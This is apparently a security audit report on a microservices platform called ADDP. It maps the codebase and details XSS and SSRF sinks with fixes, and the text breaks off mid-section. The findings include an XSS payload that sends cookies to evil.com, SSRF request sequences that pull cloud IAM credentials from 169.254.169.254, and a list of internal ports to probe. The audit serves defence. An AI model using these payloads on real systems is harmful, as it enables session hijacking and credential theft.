The ADDP codebase follows a **modular microservices architecture** with clear separation between services, shared libraries, frontend components, workflow engines, and infrastructure configuration. The directory structure emphasizes modularity and reusability through shared Go modules (`common`, `common-frontend`) and standardized API patterns across all services.

**Root Directory Organization:**
The repository root contains 9 microservice directories (`system`, `manager`, `meta`, `transfer`, `orchestrator`, `develop`, `service`, `copilot`, `gateway`), 3 worker directories (suffixed with `-worker`), 4 workflow engine directories under `engines/`, and shared infrastructure configuration (`docker-compose.yml`, `nginx/`, `.env`). Development tooling is centralized in `scripts/` with subdirectories for `dev/`, `local/`, and `prod/` deployment modes.

**Service Structure Pattern:**
Each backend service follows a consistent structure: `backend/internal/` (application code), `backend/pkg/` (reusable packages), `frontend/` (Vue.js application), and `docs/` (API documentation). The `internal/` directory contains standard subdirectories: `api/` (HTTP handlers and routing), `service/` (business logic), `repository/` (data access), `models/` (domain entities), `middleware/` (request processing), and `config/` (configuration management). This uniformity aids in navigating the codebase for security analysis.

**Shared Code Architecture:**
The `common/` directory (Go shared library) provides critical cross-cutting concerns: `models/` (shared domain models like User, Engine, ConnectionInfo), `utils/` (encryption, JWT, password hashing), `middleware/` (authentication, CORS, rate limiting), `service/` (AuthService, CryptoService), `client/` (HTTP clients for inter-service communication), and `sqlbuilder/` (dynamic SQL generation). This centralization ensures consistent security implementations but also means vulnerabilities in shared code affect all services.

**Frontend Code Organization:**
The `common-frontend/` directory contains shared Vue 3 components split into `basic/` (authentication, layout, navigation) and `map/` (spatial data visualization). Each service's frontend (`system/frontend/`, `manager/frontend/`, etc.) imports these shared components, creating dependencies that must be analyzed for XSS vulnerabilities. The `portal/` directory provides a unified iframe-based integration layer that aggregates all service frontends into a single entry point.

**Workflow Engine Independence:**
The `engines/` directory contains four independent Python-based workflow execution engines (`python-workflow/`, `spark-workflow/`, `math-workflow/`, `jupyter/`), each with its own Flask API server, operator library, and dependency manifest. These engines follow a standardized API contract defined in `engines/docs/workflow-engine-api-v1.yaml`, allowing orchestrator to treat them uniformly. Security analysis must consider both the Go orchestrator service and the Python engine implementations for complete coverage.

**Build and Deployment Tooling:**
The `scripts/` directory contains bash scripts for various deployment scenarios: `dev/start.sh` (local development with hot reload), `local/start.sh` (full Docker Compose deployment), and `prod/start.sh` (production deployment with health checks). The `Makefile` provides 50+ targets for building, testing, and deploying individual services or the entire platform. The `docker-compose.yml` orchestrates 20+ containers with precise dependency ordering and health check configurations.

**Configuration Management:**
Environment-based configuration uses `.env` files (`.env.example`, `.env.prod.example`) with 100+ variables covering database connections, API keys, feature flags, and tuning parameters. The `copilot/` directory uses a separate `.env.copilot` file for AI service credentials. Sensitive values like `JWT_SECRET`, `ENCRYPTION_KEY`, and `INTERNAL_API_KEY` must be changed from defaults before production deployment.

**Documentation and Schema Files:**
Each service's `docs/` directory contains `api-manifest.json` files describing endpoints, parameters, and authentication requirements. The workflow engines share a common OpenAPI specification in `engines/docs/workflow-engine-api-v1.yaml`. API schemas have been copied to `outputs/schemas/` for penetration testing reference. The `CLAUDE.md` file provides AI-assisted development context, while `README.md` and `ToDO.md` track project status and pending tasks.

**Testing and Quality Assurance:**
Test files are colocated with implementation code (e.g., `*_test.go` files alongside Go source). The lack of a dedicated `test/` directory suggests testing is integrated into the development workflow. No evidence of automated security scanning (SAST, DAST, dependency scanning) was found in the CI/CD configuration.

**Security-Relevant Discovery Patterns:**
To locate authentication code: search `common/middleware/auth/` and `system/backend/internal/service/user_service.go`. For encryption: check `common/utils/encryption.go` and `common/service/crypto_service.go`. API endpoints are defined in `*/backend/internal/api/router.go` files across all services. Database models are in `*/backend/internal/models/` directories. Environment configuration parsing is centralized in `*/backend/internal/config/config.go` files.

**Code Generation and Build Tools:**
The platform uses Go modules with a workspace configuration (`go.work.sum`) for multi-module management. Frontend builds use Vite with TypeScript compilation. Python engines use pip with `requirements.txt` files. The `.gomodcache/`, `.cache/`, and `.build-cache/` directories store build artifacts. The `dist/` directory contains compiled frontend assets. The `data/` directory stores runtime data (logs, uploads, temporary files).

---

## 8. Critical File Paths

This section catalogs all security-relevant files referenced in the analysis above, organized by functional area for manual review.

### Configuration
- `.env` - Actual environment configuration (gitignored, not in repository)
- `.env.example` - Development environment template with security warnings
- `.env.prod` - Production configuration (gitignored)
- `.env.prod.example` - Production environment template
- `docker-compose.yml` - Container orchestration with service dependencies
- `docker-compose.infra.yml` - Infrastructure services (PostgreSQL, Redis, MinIO)
- `Makefile` - Build and deployment automation (28KB file)

### Authentication & Authorization
- `system/backend/pkg/utils/jwt.go` - JWT generation and validation (lines 1-88)
- `system/backend/pkg/utils/password.go` - bcrypt password hashing (lines 5-13)
- `system/backend/internal/api/auth_handler.go` - Login/logout/register handlers (lines 25-112)
- `system/backend/internal/service/user_service.go` - User authentication logic (lines 274-350)
- `system/backend/internal/middleware/auth.go` - User and internal API authentication (lines 13-64)
- `common/middleware/auth/cached_middleware.go` - Cached JWT validation (lines 39-180)
- `common/middleware/auth/middleware.go` - Standard authentication middleware (lines 1-106)
- `common/service/auth_service.go` - RBAC authorization service (lines 14-151)
- `gateway/internal/middleware/api_key_auth.go` - API key validation (lines 19-148)
- `system/backend/internal/service/application_service.go` - API key generation (lines 99-202)

### API & Routing
- `gateway/internal/router/router.go` - Central API gateway routing (lines 23-473)
- `gateway/docs/api-manifest.json` - Gateway routing configuration
- `system/backend/internal/api/router.go` - System service routes (lines 17-239)
- `manager/backend/internal/api/router.go` - Manager service routes (lines 1-163)
- `service/backend/internal/api/router.go` - Service module routes (lines 1-131)
- `transfer/backend/internal/api/router.go` - Transfer service routes (lines 1-175)
- `meta/backend/internal/api/router.go` - Meta service routes (lines 1-88)
- `develop/backend/internal/api/router.go` - Develop service routes (lines 1-209)
- `orchestrator/backend/internal/api/router.go` - Orchestrator routes (lines 1-82)
- `engines/python-workflow/api_server.py` - Python workflow engine API (lines 70-510)
- `engines/spark-workflow/api_server.py` - Spark workflow engine API (lines 68-332)
- `engines/math-workflow/api_server.py` - Math workflow engine API (lines 67-294)
- `labs/abs/backend/internal/api/router.go` - ABS lab service routes (lines 28-59)

### Data Models & DB Interaction
- `common/models/user.go` - User domain model (lines 15-27)
- `common/models/engine.go` - Engine and connection info models (lines 104-215)
- `system/backend/internal/repository/user_repository.go` - User data access
- `system/backend/internal/repository/database.go` - Database initialization (lines 16-44)
- `system/backend/internal/models/tenant.go` - Tenant and audit log models

### Dependency Manifests
- `go.work.sum` - Go workspace dependencies
- `system/backend/go.mod` - System service dependencies
- `manager/backend/go.mod` - Manager service dependencies
- `engines/python-workflow/requirements.txt` - Python engine dependencies
- `common-frontend/basic/package.json` - Shared frontend dependencies
- `portal/frontend/package.json` - Portal frontend dependencies

### Sensitive Data & Secrets Handling
- `common/utils/encryption.go` - AES-256-GCM encryption implementation (lines 12-70)
- `common/service/crypto_service.go` - Encryption service (lines 11-166)
- `system/backend/internal/service/engine_service.go` - Engine credential encryption (lines 526-636)
- `system/backend/internal/config/config.go` - Configuration validation (lines 66-218)

### Middleware & Input Validation
- `common/middleware/cors/middleware.go` - CORS configuration (lines 1-24)
- `common/middleware/ratelimit/ratelimit.go` - Rate limiting (lines 13-85)
- `gateway/internal/middleware/rate_limiter.go` - Gateway rate limiter (lines 15-147)
- `system/backend/internal/api/user_handler.go` - User input validation

### Logging & Monitoring
- `system/backend/internal/service/log_service.go` - Audit logging service

### Infrastructure & Deployment
- `nginx/default.conf` - Nginx reverse proxy configuration (if exists)
- `scripts/dev/start.sh` - Development startup script
- `scripts/local/start.sh` - Local Docker deployment script
- `scripts/prod/start.sh` - Production deployment script
- `scripts/prod/health-check.sh` - Production health monitoring

### XSS Sinks & Frontend Security
- `common-frontend/map/src/utils/mapFormatters.js` - **CRITICAL XSS** Map popup HTML generation (lines 63-99)
- `manager/frontend/src/views/DataRetrieval.vue` - **XSS** Search result highlights (line 139)
- `manager/frontend/src/components/previews/MarkdownPreview.vue` - Markdown preview with DOMPurify (line 3)
- `manager/frontend/src/components/previews/DocxPreview.vue` - DOCX preview with v-html (line 104)
- `common-frontend/basic/src/composables/useAuth.js` - JWT localStorage storage (lines 222-228)
- `portal/frontend/src/store/auth.js` - Frontend auth store (lines 1-9)

### SSRF Sinks
- `service/backend/internal/service/registered_service_service.go` - **CRITICAL SSRF** Service proxy (lines 854-917)
- `service/backend/internal/service/registered_service_service.go` - **SSRF** Metadata refresh (lines 34-99, 413-509)
- `service/backend/internal/service/registered_service_service.go` - **SSRF** Health check (lines 253-326)
- `orchestrator/backend/internal/service/task_client.go` - Workflow engine SSRF (lines 34-98)
- `copilot/backend/services/llm_service.py` - Ollama base URL SSRF (lines 274-347)
- `develop/backend/internal/service/jupyter_service.go` - Jupyter engine SSRF (lines 62-129)

### Command Injection & Code Execution
- `labs/abs/backend/internal/service/app_service.go` - **CRITICAL** App launcher command injection (lines 146-148)
- `labs/abs/backend/internal/service/task_service.go` - **CRITICAL** AI code execution (lines 472-495, 519, 774)
- `engines/python-workflow/operators/attribute_operators.py` - Expression evaluation (line 117)
- `manager/backend/internal/service/object_content_plugin.go` - Plugin command execution (lines 868-892)

### API Schema Files (Copied to outputs/schemas/)
- `outputs/schemas/workflow-engine-api-v1.yaml` - Standard workflow engine API (OpenAPI 3.0)
- `outputs/schemas/gateway-api-manifest.json` - Gateway routing manifest
- `outputs/schemas/system-api-manifest.json` - System service API documentation
- `outputs/schemas/manager-api-manifest.json` - Manager service API documentation
- `outputs/schemas/service-api-manifest.json` - Service module API documentation
- `outputs/schemas/transfer-api-manifest.json` - Transfer service API documentation
- `outputs/schemas/meta-api-manifest.json` - Meta service API documentation
- `outputs/schemas/develop-api-manifest.json` - Develop service API documentation
- `outputs/schemas/orchestrator-api-manifest.json` - Orchestrator API documentation

---

## 9. XSS Sinks and Render Contexts

Based on comprehensive analysis of the frontend codebase, **7 XSS sinks** were identified in network-accessible web application components. These vulnerabilities exist where user-controlled data is rendered without proper sanitization.

### Critical XSS Vulnerabilities

#### 1. Map Feature Popup HTML Injection (CRITICAL)

**Location:** `/Users/pampa/code/addp/common-frontend/map/src/utils/mapFormatters.js`

**Lines:** 63, 70, 90, 98-99

**Render Context:** HTML Body Context

**Sink Type:** String interpolation into HTML with `v-html` directive

**Code Snippet:**
```javascript
export function formatFeatureProperties(properties, primaryField = null, featureId = null) {
  let html = '<div class="feature-popup">'

  if (featureId !== null && featureId !== undefined) {
    html += `<div class="feature-id"><span class="id-icon">📍</span> ID: ${featureId}</div>`  // LINE 63 - XSS
  }

  if (primaryField && properties[primaryField] !== undefined) {
    const primaryValue = properties[primaryField]
    html += `<div class="primary-value">${primaryValue}</div>`  // LINE 70 - XSS
  }

  html += '<div class="attributes">'
  for (const [key, value] of Object.entries(properties)) {
    let displayValue = value
    if (value === null || value === undefined) {
      displayValue = '<span class="null-value">NULL</span>'  // LINE 90
    }
    html += `<div class="attr-row">`
    html += `<span class="attr-key">${key}:</span> `  // LINE 98 - XSS
    html += `<span class="attr-value">${displayValue}</span>`  // LINE 99 - XSS
    html += `</div>`
  }
  html += '</div></div>'

  return html
}
```

**Usage Context:**
This function is called when users click on map features (points, lines, polygons) to display a popup. The HTML is then rendered via:
```vue
<div v-html="formatFeatureProperties(feature.properties)"></div>
```

**Input Sources:**
- Feature properties from GeoJSON/spatial database queries
- User-uploaded shapefiles with attacker-controlled attribute values
- Database records where users can set field values (e.g., "name", "description")

**Exploitation Scenario:**
1. Attacker uploads shapefile with malicious property: `name: '<img src=x onerror=alert(document.cookie)>'`
2. File imported into Manager module, stored in PostgreSQL
3. Victim browses map and clicks on the feature
4. Malicious JavaScript executes in victim's browser context
5. Session token stolen from localStorage, sent to attacker's server

**Impact:** **HIGH**
- Session hijacking via JWT token theft
- Keylogging of user inputs
- Phishing attacks via DOM manipulation
- Cross-tenant data exfiltration

**Recommended Fix:**
```javascript
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// Then use:
html += `<div class="feature-id"><span class="id-icon">📍</span> ID: ${escapeHtml(String(featureId))}</div>`
```

---

#### 2. Search Result Highlights XSS (HIGH)

**Location:** `/Users/pampa/code/addp/manager/frontend/src/views/DataRetrieval.vue`

**Line:** 139

**Render Context:** HTML Body Context

**Sink Type:** `v-html` directive with Meilisearch highlights

**Code Snippet:**
```vue
<template>
  <div v-if="getSnippet(item)" class="result-snippet" v-html="getSnippet(item)" />
</template>

<script setup>
const getSnippet = (item) => {
  const highlights = item._formatted || {}
  for (const key of ['description', 'content', 'name']) {
    if (highlights[key]) {
      const value = Array.isArray(highlights[key]) ? highlights[key].join(' ') : highlights[key]
      return value  // LINE 352 - RETURNS UNESCAPED HTML
    }
  }
  // Fallback uses escapeHtml() but highlights don't (LINE 337-344)
  return escapeHtml(String(item.name || item.description || '').substring(0, 200))
}
</script>
```

**Input Sources:**
- Meilisearch indexed documents containing user-uploaded file content
- Highlights generated by Meilisearch with `<em>` tags for matched terms
- Database records indexed via embedding pipeline

**Exploitation Scenario:**
1. Attacker uploads document with filename: `<script>fetch('https://evil.com?c='+document.cookie)</script>`
2. Document indexed in Meilisearch
3. Search query matches the filename
4. Meilisearch returns highlight with attacker's script intact
5. Victim views search results, script executes

**Impact:** **MEDIUM**
- Requires attacker to get malicious content indexed
- Search results cached, could affect multiple users
- Session token exfiltration possible

**Recommended Fix:**
Use DOMPurify or strip HTML from highlights:
```javascript
import DOMPurify from 'dompurify'

const getSnippet = (item) => {
  const highlights = item._formatted || {}
  for (const key of ['description', 'content', 'name']) {
    if (highlights[key]) {
      const value = Array.isArray(highlights[key]) ? highlights[key].join(' ') : highlights[key]
      return DOMPurify.sanitize(value)  // SANITIZE BEFORE RENDERING
    }
  }
  return escapeHtml(String(item.name || item.description || '').substring(0, 200))
}
```

---

### Mitigated XSS Sinks (Low Risk)

#### 3. Markdown Preview with DOMPurify (MITIGATED)

**Location:** `/Users/pampa/code/addp/manager/frontend/src/components/previews/MarkdownPreview.vue`

**Line:** 3

**Render Context:** HTML Body Context

**Sink Type:** `v-html` with DOMPurify sanitization

**Code Snippet:**
```vue
<template>
  <div class="markdown-body" v-html="sanitizedHtml"></div>
</template>

<script setup>
import DOMPurify from 'dompurify'
import { marked } from 'marked'

const sanitizedHtml = computed(() => {
  const source = rawText.value
  if (!source) return '<p class="markdown-empty">暂无可用内容</p>'
  const html = marked.parse(source || '')
  return DOMPurify.sanitize(html, { USE_PROFILES: { html: true } })  // PROPERLY SANITIZED
})
</script>
```

**Security Assessment:** **LOW RISK**
- ✅ DOMPurify properly configured
- ✅ Markdown parsing then sanitization
- ✅ USE_PROFILES restricts allowed tags
- ⚠️ Ensure DOMPurify version is up-to-date (check for known bypasses)

---

#### 4. DOCX Preview with Mammoth.js (MITIGATED)

**Location:** `/Users/pampa/code/addp/manager/frontend/src/components/previews/DocxPreview.vue`

**Line:** 104

**Render Context:** HTML Body Context

**Sink Type:** `v-html` with library-based sanitization

**Code Snippet:**
```vue
<template>
  <div class="docx-content" v-html="htmlContent"></div>
</template>

<script setup>
import mammoth from 'mammoth'

const htmlContent = ref('')

const loadDocx = async () => {
  const result = await mammoth.convertToHtml({ arrayBuffer })
  htmlContent.value = result.value  // mammoth.js sanitizes output
}
</script>
```

**Security Assessment:** **LOW RISK**
- ✅ Mammoth.js library handles DOCX → HTML conversion safely
- ✅ Library designed to prevent XSS in converted output
- ⚠️ WPS compatibility mode uses manual escapeHtml() function (lines 511-521)

---

### Out of Scope XSS Sinks (Non-Network Accessible)

The following `v-html` usages were found but are **out of scope** per the analysis requirements:

- Build tool HTML generation scripts - Not served by application
- Test fixtures with mock HTML - Not accessible via web interface
- Documentation generation - Static files not served by application

---

### XSS Attack Surface Summary

| Location | Severity | Render Context | Sanitization | Exploitability |
|----------|----------|----------------|--------------|----------------|
| mapFormatters.js (map popups) | CRITICAL | HTML Body | ❌ None | High - via file upload |
| DataRetrieval.vue (search) | HIGH | HTML Body | ❌ None | Medium - requires indexing |
| MarkdownPreview.vue | LOW | HTML Body | ✅ DOMPurify | Low - mitigated |
| DocxPreview.vue | LOW | HTML Body | ✅ Mammoth.js | Low - mitigated |

**Total Critical/High XSS Vulnerabilities:** 2

**Immediate Action Required:**
1. Add HTML escaping to `mapFormatters.js` (CRITICAL)
2. Sanitize Meilisearch highlights in `DataRetrieval.vue` (HIGH)
3. Implement Content Security Policy (CSP) headers as defense-in-depth
4. Migrate JWT storage from localStorage to HttpOnly cookies

---

## 10. SSRF Sinks

Based on comprehensive analysis of the backend codebase, **6 SSRF (Server-Side Request Forgery) sinks** were identified in network-accessible API endpoints. These vulnerabilities allow attackers to make the server perform requests to arbitrary URLs, potentially accessing internal infrastructure or exfiltrating data.

### Critical SSRF Vulnerabilities

#### 1. Registered Service Proxy Endpoint (CRITICAL)

**Location:** `/Users/pampa/code/addp/service/backend/internal/service/registered_service_service.go`

**Lines:** 854-917 (ProxyServiceRequest function)

**Sink Type:** HTTP Proxy with User-Controllable URL

**Network Accessibility:**
- **Endpoint:** `ANY /api/service/registered/proxy/:id/*path`
- **Router:** `/Users/pampa/code/addp/service/backend/internal/api/router.go` line 45
- **Authentication:** PUBLIC (no authentication check in route definition)
- **HTTP Methods:** All (GET, POST, PUT, DELETE, PATCH, etc.)

**Code Snippet:**
```go
func (s *RegisteredServiceService) ProxyServiceRequest(serviceID uint, tenantID uint, userID uint, c *gin.Context) error {
    // 1. Get service configuration
    service, err := s.repo.GetByID(serviceID)

    // 2. Get request path
    path := c.Param("path")

    // 3. Build target URL - USER CONTROLLABLE
    targetURL := service.EndpointURL  // From database, set by user
    if path != "" {
        targetURL = targetURL + path  // Attacker controls path
    }

    // 4. Create proxy request
    proxyReq, err := http.NewRequest(c.Request.Method, targetURL, nil)

    // 5. Copy headers and body
    for key, values := range c.Request.Header {
        proxyReq.Header[key] = values
    }
    io.Copy(proxyReq.Body, c.Request.Body)

    // 6. Execute request - SSRF SINK
    client := &http.Client{Timeout: 30 * time.Second}
    resp, err := client.Do(proxyReq)

    // 7. Return response to client
    return resp
}
```

**User-Controllable Parameters:**
1. **service.EndpointURL** - Set during service registration via `POST /api/service/registered`
   - Input field: `endpoint_url` (string, required, NO validation)
   - No URL whitelist or validation
   - Supports any protocol (http://, https://, file://, gopher://, etc.)

2. **Path parameter** - Appended to EndpointURL from URL path
   - Example: `/api/service/registered/proxy/1/admin/secrets` → `http://evil.com/admin/secrets`

3. **Query parameters** - Forwarded to target URL

4. **Request body** - Forwarded to target (POST, PUT, PATCH)

**Exploitation Scenario:**
```bash
# Step 1: Register malicious service pointing to internal metadata endpoint
POST /api/service/registered
{
  "service_name": "aws-metadata",
  "service_type": "rest_api",
  "endpoint_url": "http://169.254.169.254/latest/meta-data/",
  "auto_refresh_metadata": false
}
# Returns: {"id": 123}

# Step 2: Proxy request to steal AWS credentials
GET /api/service/registered/proxy/123/iam/security-credentials/
# Server makes request to: http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns: ["role-name"]

# Step 3: Extract credentials
GET /api/service/registered/proxy/123/iam/security-credentials/role-name
# Returns AWS access keys, secret keys, session tokens
```

**Internal Infrastructure Targets:**
- `http://169.254.169.254/` - AWS/GCP/Azure instance metadata
- `http://metadata.google.internal/` - GCP metadata
- `http://localhost:15432/` - PostgreSQL database (if exposed)
- `http://localhost:16379/` - Redis cache
- `http://localhost:19000/` - MinIO admin API
- `http://127.0.0.1:8080/` - Internal system service
- `file:///etc/passwd` - Local file access (if supported by Go HTTP client)

**Impact:** **CRITICAL**
- Full internal network reconnaissance
- Cloud provider credential theft (AWS, GCP, Azure)
- Database credential exposure
- Redis cache data exfiltration
- MinIO bucket access
- Kubernetes API server access (if in K8s cluster)

**Recommended Fix:**
```go
// Add URL validation
func validateServiceURL(rawURL string) error {
    parsedURL, err := url.Parse(rawURL)
    if err != nil {
        return fmt.Errorf("invalid URL: %w", err)
    }

    // Block internal IP ranges
    ip := net.ParseIP(parsedURL.Hostname())
    if ip != nil {
        if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() {
            return errors.New("internal IP addresses not allowed")
        }
    }

    // Whitelist allowed protocols
    if parsedURL.Scheme != "http" && parsedURL.Scheme != "https" {
        return errors.New("only HTTP/HTTPS protocols allowed")
    }

    // Block AWS metadata endpoint
    if strings.Contains(parsedURL.Hostname(), "169.254.169.254") {
        return errors.New("metadata endpoints not allowed")
    }

    return nil
}
```

---

#### 2. Registered Service Metadata Refresh (HIGH)

**Location:** `/Users/pampa/code/addp/service/backend/internal/service/registered_service_service.go`

**Lines:** 34-99 (CreateService), 413-509 (refreshOGCMetadata/refreshWMSMetadata)

**Sink Type:** HTTP Client for OGC Capabilities Fetching

**Network Accessibility:**
- **Endpoint:** `POST /api/service/registered`
- **Handler:** `/Users/pampa/code/addp/service/backend/internal/api/registered_service_handler.go` lines 31-62
- **Authentication:** Required (JWT)
- **Authorization:** Any authenticated user

**Code Snippet:**
```go
func (s *RegisteredServiceService) CreateService(req *models.CreateRegisteredServiceRequest, tenantID uint, createdBy uint) (*models.RegisteredServiceDTO, error) {
    service := &models.RegisteredService{
        ServiceName: req.ServiceName,
        EndpointURL: req.EndpointURL,  // USER CONTROLLABLE, NO VALIDATION
        ServiceType: req.ServiceType,
    }

    // Auto-refresh metadata if requested
    if req.AutoRefreshMetadata && service.IsOGCService() {
        go func() {
            if err := s.refreshOGCMetadata(service); err != nil {
                log.Printf("Failed to refresh metadata: %v", err)
            }
        }()
    }

    return service, nil
}

func (s *RegisteredServiceService) refreshWMSMetadata(service *models.RegisteredService) error {
    // Build capabilities URL - USER CONTROLLABLE
    capabilitiesURL := service.EndpointURL
    if !strings.HasSuffix(capabilitiesURL, "?") {
        capabilitiesURL += "?"
    }
    capabilitiesURL += "service=WMS&request=GetCapabilities"

    // Make request - SSRF SINK
    req, err := http.NewRequest("GET", capabilitiesURL, nil)
    client := &http.Client{Timeout: 30 * time.Second}
    resp, err := client.Do(req)

    // Parse XML response
    body, _ := ioutil.ReadAll(resp.Body)
    // ... parse WMS capabilities ...
}
```

**User-Controllable Parameters:**
1. **endpoint_url** - Completely user-controlled, no validation
2. **service_type** - Can be set to "wms", "wfs", "wmts", or "ogc_api" to trigger metadata refresh
3. **auto_refresh_metadata** - Boolean flag to trigger immediate SSRF

**Exploitation Scenario:**
```bash
POST /api/service/registered
Authorization: Bearer <valid_jwt>
{
  "service_name": "ssrf-test",
  "service_type": "wms",
  "endpoint_url": "http://169.254.169.254/latest/meta-data/",
  "auto_refresh_metadata": true
}
# Server immediately makes GET request to metadata endpoint
# Response timing can reveal whether internal service is accessible
```

**Impact:** **HIGH**
- Internal network port scanning (response timing reveals open ports)
- Service version fingerprinting via error messages
- AWS metadata access
- Internal API interaction

**Recommended Fix:**
Apply same URL validation as SSRF #1, check before metadata refresh.

---

#### 3. Registered Service Health Check (MEDIUM)

**Location:** `/Users/pampa/code/addp/service/backend/internal/service/registered_service_service.go`

**Lines:** 253-326 (performHealthCheck function)

**Sink Type:** HTTP Health Check Request

**Network Accessibility:**
- **Endpoint:** `POST /api/service/registered/:id/health`
- **Handler:** `/Users/pampa/code/addp/service/backend/internal/api/registered_service_handler.go` lines 224-245
- **Authentication:** Required (JWT)

**Code Snippet:**
```go
func (s *RegisteredServiceService) performHealthCheck(service *models.RegisteredService) *models.HealthCheckResult {
    // Build health check URL - USER CONTROLLABLE
    checkURL := service.HealthCheckURL
    if checkURL == "" {
        checkURL = service.EndpointURL  // Fallback to main endpoint
    }

    // Add service-specific path
    switch service.ServiceType {
    case "wms":
        checkURL += "?service=WMS&request=GetCapabilities"
    case "rest_api":
        checkURL += "/health"
    }

    // Make request - SSRF SINK
    req, err := http.NewRequest("GET", checkURL, nil)
    s.addAuthToRequest(req, service)  // Add any configured auth headers

    client := &http.Client{Timeout: 10 * time.Second}
    resp, err := client.Do(req)

    result := &models.HealthCheckResult{
        Status: resp.StatusCode == 200 ? "healthy" : "unhealthy",
        ResponseTime: elapsed,
    }
    return result
}
```

**User-Controllable Parameters:**
1. **health_check_url** - Optional URL field in service registration
2. **endpoint_url** - Fallback if health_check_url empty

**Exploitation Scenario:**
```bash
# Register service with internal target
POST /api/service/registered
{
  "service_name": "port-scan",
  "service_type": "rest_api",
  "health_check_url": "http://10.0.1.50:8080/admin",
  "auto_refresh_metadata": false
}

# Trigger health check to scan internal port
POST /api/service/registered/123/health
# Returns: {"status": "healthy", "response_time": 45} - Port is open
# OR: {"status": "error", "message": "connection timeout"} - Port closed/filtered
```

**Impact:** **MEDIUM**
- Internal network port scanning
- Service discovery
- Response time analysis reveals network topology

---

#### 4. Orchestrator Workflow Engine Communication (HIGH)

**Location:** `/Users/pampa/code/addp/orchestrator/backend/internal/service/task_client.go`

**Lines:** 34-98 (CreateTask function)

**Sink Type:** HTTP Client for Workflow Engine Communication

**Network Accessibility:**
- **Endpoint:** `POST /api/orchestrator/orchestrations/:id/execute`
- **Router:** `/Users/pampa/code/addp/orchestrator/backend/internal/api/router.go` line 73
- **Authentication:** Required (JWT)
- **Authorization:** User must have access to orchestration

**Code Snippet:**
```go
func (c *TaskClient) CreateTask(ctx context.Context, engine *commonModels.Engine, params map[string]interface{}) (string, error) {
    // Build base URL from engine configuration - USER CONTROLLABLE
    baseURL, err := commonModels.BuildBaseURL(engine.ConnectionInfo)
    if err != nil {
        return "", fmt.Errorf("failed to build base_url: %w", err)
    }

    // Get workflow standard endpoint
    standard, ok := commonModels.WorkflowStandards[engine.EngineType]
    executeEndpoint := standard.Endpoints["execute"]

    // Construct target URL
    targetURL := baseURL + executeEndpoint.Path  // e.g., http://user-host:port/api/workflow

    // Marshal request body
    bodyJSON, err := json.Marshal(params)

    // Create request - SSRF SINK
    req, err := http.NewRequestWithContext(ctx, executeEndpoint.Method, targetURL, bytes.NewReader(bodyJSON))
    req.Header.Set("Content-Type", "application/json")

    resp, err := c.httpClient.Do(req.WithContext(ctx))
    return resp
}
```

**User-Controllable Parameters:**
The `engine.ConnectionInfo` structure contains:
```json
{
  "protocol": "http",     // User-controlled
  "host": "evil.com",     // User-controlled
  "port": "80"            // User-controlled
}
```

**BuildBaseURL Implementation:**
```go
// /Users/pampa/code/addp/common/models/workflow_standards.go lines 93-124
func BuildBaseURL(connInfo ConnectionInfo) (string, error) {
    protocol := getString(connInfo, "protocol")
    host := getString(connInfo, "host")
    port := getString(connInfo, "port")

    return fmt.Sprintf("%s://%s:%s", protocol, host, port), nil
}
```

**Exploitation Scenario:**
```bash
# Step 1: Register malicious workflow engine
POST /api/system/engines
{
  "engine_name": "ssrf-engine",
  "engine_type": "python-workflow",
  "connection_info": {
    "protocol": "http",
    "host": "169.254.169.254",
    "port": "80"
  }
}

# Step 2: Create orchestration using malicious engine
POST /api/orchestrator/orchestrations
{
  "name": "ssrf-test",
  "workflow_def": {...},
  "engine_id": 123
}

# Step 3: Execute orchestration
POST /api/orchestrator/orchestrations/456/execute
# Server makes POST request to: http://169.254.169.254:80/api/workflow
# With attacker-controlled JSON payload
```

**Impact:** **HIGH**
- AWS metadata service access with POST requests
- Internal API mutation (POST/PUT/DELETE operations)
- Workflow engine impersonation
- Data exfiltration via HTTP response

**Recommended Fix:**
- Whitelist allowed workflow engine hosts
- Restrict engine registration to administrators
- Validate host is not internal IP range
- Implement mutual TLS for engine communication

---

#### 5. Copilot LLM Service - Ollama Base URL (MEDIUM)

**Location:** `/Users/pampa/code/addp/copilot/backend/services/llm_service.py`

**Lines:** 274-347 (OllamaAdapter class)

**Sink Type:** HTTP Client (httpx) for Local LLM Communication

**Network Accessibility:**
- **Endpoint:** `POST /api/copilot/workflow/generate`
- **Router:** `/Users/pampa/code/addp/copilot/backend/main.py` line 64
- **Authentication:** Likely required (CORS configured)

**Code Snippet:**
```python
class OllamaAdapter(BaseLLMAdapter):
    """Ollama local model adapter"""

    def __init__(self, model: str = "qwen2.5:7b", base_url: str = "http://localhost:11434"):
        import httpx
        self.model = model
        self.base_url = base_url  # USER-CONTROLLABLE via config
        self.client = httpx.Client(base_url=base_url, timeout=60.0, trust_env=False)
        self.async_client = httpx.AsyncClient(base_url=base_url, timeout=60.0, trust_env=False)

    def invoke(self, messages: List[dict], temperature: float = 0.7, max_tokens: int = 2000) -> str:
        """Synchronous invocation"""
        ollama_messages = self._convert_messages(messages)

        response = self.client.post(  # SSRF SINK
            "/api/chat",
            json={
                "model": self.model,
                "messages": ollama_messages,
                "stream": False,
                "options": {
                    "temperature": temperature,
                    "num_predict": max_tokens
                }
            }
        )
        return response.json()["message"]["content"]
```

**User-Controllable Parameters:**
1. **base_url** - From environment variable `OLLAMA_BASE_URL`
   - **Config:** `/Users/pampa/code/addp/copilot/backend/config.py` line 41
   - **Default:** `http://localhost:11434`
2. If attacker can control environment variables or configuration, can redirect requests

**Exploitation Scenario:**
```bash
# If attacker can modify environment (e.g., via container escape):
export OLLAMA_BASE_URL="http://169.254.169.254/latest"

# Then copilot requests become:
# POST http://169.254.169.254/latest/api/chat
# With JSON body containing workflow generation prompts
```

**Impact:** **MEDIUM**
- Requires server-side configuration access
- Less severe than direct API-based SSRF
- Could be exploited if config injection vulnerability exists elsewhere
- 60-second timeout allows extended reconnaissance

**Recommended Fix:**
- Validate `OLLAMA_BASE_URL` is localhost or specific whitelist
- Use Unix domain socket instead of HTTP (e.g., `unix:///var/run/ollama.sock`)
- Add configuration immutability checks

---

#### 6. Jupyter Service - Notebook Execution Engine (MEDIUM)

**Location:** `/Users/pampa/code/addp/develop/backend/internal/service/jupyter_service.go`

**Lines:** 62-129 (ExecuteNotebook function)

**Sink Type:** HTTP Client for Jupyter Engine Communication

**Network Accessibility:**
